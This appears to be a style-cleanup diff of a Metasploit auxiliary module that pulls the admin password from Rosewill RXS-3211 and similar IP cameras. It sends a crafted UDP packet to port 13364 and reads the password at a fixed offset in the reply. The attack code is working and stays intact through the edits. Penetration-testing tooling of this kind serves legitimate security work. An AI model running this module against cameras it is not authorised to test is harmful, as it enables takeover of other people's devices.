@@ -1,13 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -15,13 +14,13 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'        => 'Rosewill RXS-3211 IP Camera Password Retriever',
-      'Description' => %q{
+      'Description' => %q(
           This module takes advantage of a protocol design issue with the Rosewill admin
         executable in order to retrieve passwords, allowing remote attackers to take
         administrative control over the device.  Other similar IP Cameras such as Edimax,
         Hawking, Zonet, etc, are also believed to have the same flaw, but not fully tested.
         The protocol deisgn issue also allows attackers to reset passwords on the device.
-      },
+      ),
       'Author'      => 'Ben Schmidt',
       'License'     => MSF_LICENSE
     )
@@ -29,53 +28,50 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::CHOST,
-        Opt::RPORT(13364),
-      ], self.class)
+        Opt::RPORT(13364)
+      ], self.class
+    )
   end
 
   def run_host(ip)
-    #Protocol
+    # Protocol
     target_mac = "\xff\xff\xff\xff\xff\xff"
-    cmd  = "\x00"          #Request
-    cmd << "\x06\xff\xf9"  #Type
+    cmd = "\x00" # Request
+    cmd << "\x06\xff\xf9" # Type
 
     password = nil
 
     begin
       # Create an unbound UDP socket if no CHOST is specified, otherwise
       # create a UDP socket bound to CHOST (in order to avail of pivoting)
-      udp_sock = Rex::Socket::Udp.create( {
-        'LocalHost' => datastore['CHOST'] || nil,
-        'PeerHost'  => ip,
-        'PeerPort'  => datastore['RPORT'],
-        'Context'   =>
+      udp_sock = Rex::Socket::Udp.create('LocalHost' => datastore['CHOST'] || nil,
+                                         'PeerHost'  => ip,
+                                         'PeerPort'  => datastore['RPORT'],
+                                         'Context'   =>
         {
           'Msf' => framework,
           'MsfExploit' => self
-        }
-      })
+        })
 
-      udp_sock.put(target_mac+cmd)
+      udp_sock.put(target_mac + cmd)
 
-      res = udp_sock.recvfrom(65535, 0.5) and res[1]
+      (res = udp_sock.recvfrom(65535, 0.5)) && res[1]
 
-      #Parse the reply if we get a response
-      if res
-        password = parse_reply(res)
-      end
+      # Parse the reply if we get a response
+      password = parse_reply(res) if res
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
       print_error("Connection error")
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Exception => e
       print_error("Unknown error: #{e.class} #{e}")
     ensure
-      udp_sock.close if udp_sock
+      udp_sock&.close
     end
 
-    #Store the password if the parser returns something
+    # Store the password if the parser returns something
     if password
-      print_status("Password retrieved: #{password.to_s}")
+      print_status("Password retrieved: #{password}")
       report_cred(
         ip: rhost,
         port: rport,
@@ -117,13 +113,10 @@ class MetasploitModule < Msf::Auxiliary
     @results ||= {}
 
     # Ignore "empty" packets
-    return nil if not pkt[1]
+    return nil unless pkt[1]
 
-    if(pkt[1] =~ /^::ffff:/)
-      pkt[1] = pkt[1].sub(/^::ffff:/, '')
-    end
+    pkt[1] = pkt[1].sub(/^::ffff:/, '') if pkt[1] =~ /^::ffff:/
 
-    return pkt[0][333,12] if pkt[0][6,4] == "\x01\x06\xff\xf9"
+    return pkt[0][333, 12] if pkt[0][6, 4] == "\x01\x06\xff\xf9"
   end
-
 end
